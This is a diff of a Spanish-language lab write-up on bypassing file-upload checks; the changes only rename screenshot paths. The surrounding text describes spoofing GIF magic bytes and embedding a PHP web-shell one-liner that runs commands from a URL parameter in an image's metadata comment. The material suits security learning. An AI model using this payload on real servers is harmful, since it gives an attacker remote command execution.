@@ -6,21 +6,21 @@ Este enfoque demuestra cómo combinar formatos de archivo puede burlar validacio
 
 Solucion
 nos logeamos y subimos el arhivo
-![Pasted image 20250830210153.png](imagenes/Pasted image 20250830210153.png)
+![Pasted_image_20250830210153.png](Imagenes/Pasted_image_20250830210153.png)
 ahora nos vamos al historico y mandamo al repeater la peticion get
 ahora si nosotros ponesmo GIF8; el servidor va interpretar que estamos subiendo un archivo .git
-![Pasted image 20250830210525.png](imagenes/Pasted image 20250830210525.png)
-![Pasted image 20250830210627.png](imagenes/Pasted image 20250830210627.png)
+![Pasted_image_20250830210525.png](Imagenes/Pasted_image_20250830210525.png)
+![Pasted_image_20250830210627.png](Imagenes/Pasted_image_20250830210627.png)
 otra opcion es la siguiente
 descargamos una imagen
 y verificamos los metadatos
-![Pasted image 20250830211346.png](imagenes/Pasted image 20250830211346.png)
+![Pasted_image_20250830211346.png](Imagenes/Pasted_image_20250830211346.png)
 y aqui la idea es agarra la parte de coment y ponerle el archivo php
 <?php system($_GET['cmd']); ?>
-![Pasted image 20250830211652.png](imagenes/Pasted image 20250830211652.png)
-![Pasted image 20250830211730.png](imagenes/Pasted image 20250830211730.png)
+![Pasted_image_20250830211652.png](Imagenes/Pasted_image_20250830211652.png)
+![Pasted_image_20250830211730.png](Imagenes/Pasted_image_20250830211730.png)
 ahora vamos a testearlo
-![Pasted image 20250830211832.png](imagenes/Pasted image 20250830211832.png)
+![Pasted_image_20250830211832.png](Imagenes/Pasted_image_20250830211832.png)
 y ya solo subimos el archivo y lo vemos
-![Pasted image 20250830212109.png](imagenes/Pasted image 20250830212109.png)
-![Pasted image 20250830212300.png](imagenes/Pasted image 20250830212300.png)
+![Pasted_image_20250830212109.png](Imagenes/Pasted_image_20250830212109.png)
+![Pasted_image_20250830212300.png](Imagenes/Pasted_image_20250830212300.png)
